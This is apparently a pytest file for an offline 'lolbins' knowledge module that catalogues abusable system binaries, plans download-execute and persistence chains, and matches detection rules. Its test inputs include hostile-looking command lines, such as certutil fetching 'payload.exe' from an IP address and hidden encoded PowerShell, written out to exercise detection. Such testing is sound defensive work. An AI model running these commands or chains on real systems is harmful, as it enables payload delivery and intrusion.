"""Tests for lolbins.py — offline knowledge engine (executes nothing)."""
import ast

import pytest

from offensive import lolbins


def test_db_has_40plus_entries_across_3_platforms():
    assert len(lolbins.LOLBIN_DB) >= 40
    for pf in lolbins.PLATFORMS:
        n = sum(1 for e in lolbins.LOLBIN_DB if pf in e["platforms"])
        assert n >= 3, "platform %s underrepresented" % pf
    for e in lolbins.LOLBIN_DB:
        assert e["name"] and e["platforms"] and e["techniques"]
        assert e["examples"] and e["mitre"] and e["detect"]
        assert set(e["techniques"]) <= set(lolbins.TECHNIQUES)
        assert set(e["platforms"]) <= set(lolbins.PLATFORMS)
        assert all(m.startswith("T") for m in e["mitre"])


def test_lookup_by_name_alias_technique_and_mitre():
    assert lolbins.technique_lookup("certutil")[0]["name"] == "certutil"
    # alias with .exe
    assert lolbins.technique_lookup("certutil.exe")[0]["name"] == "certutil"
    assert lolbins.technique_lookup("python3")[0]["name"] == "python"
    # by abuse technique
    dl = lolbins.technique_lookup("download")
    names = {e["name"] for e in dl}
    assert "certutil" in names and "curl" in names
    # by MITRE id
    t1105 = lolbins.technique_lookup("T1105")
    assert {e["name"] for e in t1105} >= {"certutil", "bitsadmin", "curl"}
    t1218 = lolbins.technique_lookup("T1218.005")
    assert {e["name"] for e in t1218} <= {"mshta", "curl-macos"}
    assert lolbins.technique_lookup("T9999") == []
    assert lolbins.technique_lookup("zzz-not-a-thing") == []


def test_build_chain_ordered_with_detection_notes():
    for goal in lolbins._CHAINS:  # all supported goals
        for platform in lolbins.PLATFORMS:
            ch = lolbins.build_chain(goal, platform)
            assert ch["goal"] == goal and ch["platform"] == platform
            orders = [s["order"] for s in ch["steps"]]
            assert orders == sorted(orders)
            for s in ch["steps"]:
                assert s["detection_note"], "missing detection note"
                assert s["binaries"], "empty binaries for %s/%s" % (
                    goal, platform)
                # every binary exists on this platform
                for b in s["binaries"]:
                    e = lolbins.technique_lookup(b)[0]
                    assert platform in e["platforms"]
    with pytest.raises(ValueError):
        lolbins.build_chain("nope", "windows")
    with pytest.raises(ValueError):
        lolbins.build_chain("persistence", "amiga")


def test_build_chain_download_execute_shape():
    ch = lolbins.build_chain("download-execute", "windows")
    assert [s["technique"] for s in ch["steps"]] == [
        "download", "encode", "execute"]
    assert "certutil" in ch["steps"][0]["binaries"]
    assert "powershell" in ch["steps"][2]["binaries"]
    assert "osascript" not in ch["steps"][2]["binaries"]


def test_detection_rules_matches_certutil_urlcache():
    cmd = "certutil -urlcache -split -f http://10.0.0.1/payload.exe out.exe"
    hits = lolbins.detection_rules(cmd)
    assert any(h["binary"] == "certutil" and h["technique"] == "download"
               for h in hits)
    assert all(h["mitre"].startswith("T") for h in hits)
    assert all(h["detection_note"] for h in hits)
    assert all(h["matched_rule"] for h in hits)
    # encoded powershell
    hits = lolbins.detection_rules(
        "powershell -nop -w hidden -enc AAAA")
    assert any(h["binary"] == "powershell" and h["technique"] == "encode"
               for h in hits)
    # benign line matches nothing
    assert lolbins.detection_rules("notepad readme.txt") == []
    # case-insensitive
    assert lolbins.detection_rules("CERTUTIL -URLCACHE -F "
                                   "http://x/y out") != []


def test_emit_inventory_finding_shape():
    f = lolbins.emit_inventory(
        "windows", ["certutil", "mshta", "notepad-unknown-xyz"])
    assert f["severity"] == "INFO"
    assert f["verification"] == "static-analysis"
    assert "manual-required" in f["verification_note"]
    assert "certutil" in f["evidence"] and "mshta" in f["evidence"]
    assert "notepad-unknown-xyz" not in f["evidence"]
    assert f["confidence"] == "candidate"
    assert f["remediation"]
    with pytest.raises(ValueError):
        lolbins.emit_inventory("amiga", ["certutil"])


def test_pure_python_no_external_calls():
    src = open(lolbins.__file__).read()
    # no external-capability imports (doc strings may mention primitives)
    tree = ast.parse(src)
    imported = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            imported.update(a.name for a in node.names)
        elif isinstance(node, ast.ImportFrom) and node.module:
            imported.add(node.module)
    assert imported <= {"re", "vulnscan2"}, \
        "unexpected imports: %s" % sorted(imported)
    # module import makes no network/process side effects; nothing executed
    assert not any(getattr(lolbins, n, None)
                   for n in ("subprocess", "socket", "requests"))


def test_nothing_executed_during_module_use():
    # a guard sentinel: if any code tried to run a binary, PATH lookup in
    # this stripped env would fail loudly. Run detection + chain planning
    # and confirm they are pure string ops (returns are dicts/lists).
    hits = lolbins.detection_rules("certutil -decode a.b64 a.exe")
    assert hits[0]["technique"] == "encode"
    ch = lolbins.build_chain("file-read", "linux")
    assert ch["steps"][0]["technique"] == "file-read"
